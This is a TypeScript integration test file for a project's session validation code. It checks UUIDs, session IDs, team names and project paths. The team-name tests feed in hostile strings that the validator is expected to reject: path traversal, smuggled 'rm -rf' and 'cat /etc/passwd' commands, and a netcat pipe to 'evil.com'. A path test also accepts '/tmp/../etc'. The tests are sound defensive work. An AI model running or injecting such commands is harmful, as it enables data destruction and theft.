/**
 * Integration tests for Session Validation
 * Tests core validation functions for UUIDs, team names, and paths
 *
 * NEW ARCHITECTURE CHANGES:
 * - All sessions require fromTeam (no null/external allowed)
 * - Team name validation is stricter
 * - Path validation remains unchanged
 */

import { describe, it, expect } from "vitest";
import {
  validateUUID,
  validateSessionId,
  validateTeamName,
  validateSecureProjectPath,
  generateSecureUUID,
} from "../../../src/session/validation.js";
import { mkdirSync, rmSync } from "fs";

describe("Session Validation Integration", () => {
  describe("UUID validation", () => {
    it("should validate correct UUID v4", () => {
      const validUUID = "550e8400-e29b-41d4-a716-446655440000";
      expect(validateUUID(validUUID)).toBe(true);
    });

    it("should reject invalid UUID format", () => {
      expect(validateUUID("not-a-uuid")).toBe(false);
      expect(validateUUID("")).toBe(false);
    });

    it("should generate valid UUID", () => {
      const uuid = generateSecureUUID();
      expect(validateUUID(uuid)).toBe(true);
    });

    it("should generate unique UUIDs", () => {
      const uuid1 = generateSecureUUID();
      const uuid2 = generateSecureUUID();
      expect(uuid1).not.toBe(uuid2);
    });
  });

  describe("Session ID validation", () => {
    it("should accept valid session ID", () => {
      const validId = generateSecureUUID();
      expect(() => validateSessionId(validId)).not.toThrow();
    });

    it("should reject empty session ID", () => {
      expect(() => validateSessionId("")).toThrow("Session ID cannot be empty");
    });

    it("should reject invalid UUID format", () => {
      expect(() => validateSessionId("invalid-id")).toThrow(
        "Invalid session ID format",
      );
    });

    it("should reject null or undefined session ID", () => {
      expect(() => validateSessionId(null as any)).toThrow();
      expect(() => validateSessionId(undefined as any)).toThrow();
    });
  });

  describe("Team name validation", () => {
    it("should accept valid team names", () => {
      expect(() => validateTeamName("frontend")).not.toThrow();
      expect(() => validateTeamName("team-alpha")).not.toThrow();
      expect(() => validateTeamName("team_beta")).not.toThrow();
      expect(() => validateTeamName("team@example")).not.toThrow();
      expect(() => validateTeamName("team-iris")).not.toThrow();
    });

    it("should reject empty team name", () => {
      expect(() => validateTeamName("")).toThrow("Team name cannot be empty");
    });

    it("should reject dangerous characters", () => {
      expect(() => validateTeamName("team/../etc")).toThrow(
        "dangerous character",
      );
      expect(() => validateTeamName("team;rm -rf")).toThrow(
        "dangerous character",
      );
      expect(() => validateTeamName("team\x00null")).toThrow(
        "dangerous character",
      );
    });

    it("should reject path traversal attempts", () => {
      expect(() => validateTeamName("../../../etc")).toThrow(
        "dangerous character",
      );
      expect(() => validateTeamName("team/../../passwd")).toThrow(
        "dangerous character",
      );
    });

    it("should reject shell injection attempts", () => {
      expect(() => validateTeamName("team; cat /etc/passwd")).toThrow(
        "dangerous character",
      );
      expect(() => validateTeamName("team && echo bad")).toThrow(
        "dangerous character",
      );
      expect(() => validateTeamName("team | nc evil.com")).toThrow(
        "dangerous character",
      );
    });

    it("should reject null or undefined team name", () => {
      expect(() => validateTeamName(null as any)).toThrow();
      expect(() => validateTeamName(undefined as any)).toThrow();
    });
  });

  describe("Project path validation", () => {
    const testDir = "/tmp/iris-test-project";

    it("should accept valid project path", () => {
      // Create test directory
      mkdirSync(testDir, { recursive: true });

      expect(() => validateSecureProjectPath(testDir)).not.toThrow();

      // Cleanup
      rmSync(testDir, { recursive: true });
    });

    it("should reject non-existent path", () => {
      expect(() =>
        validateSecureProjectPath("/tmp/does-not-exist-12345"),
      ).toThrow("does not exist");
    });

    it("should reject relative paths", () => {
      // Relative paths will fail the existence check first
      expect(() => validateSecureProjectPath("relative/path")).toThrow(
        "does not exist",
      );
    });

    it("should handle path traversal that resolves to valid path", () => {
      // Path traversal that resolves to an existing directory is allowed
      // The function resolves symlinks and checks the final path
      // /tmp/../etc resolves to /etc which exists on most systems
      expect(() => validateSecureProjectPath("/tmp/../etc")).not.toThrow();
    });

    it("should reject null or undefined project path", () => {
      expect(() => validateSecureProjectPath(null as any)).toThrow();
      expect(() => validateSecureProjectPath(undefined as any)).toThrow();
    });
  });
});
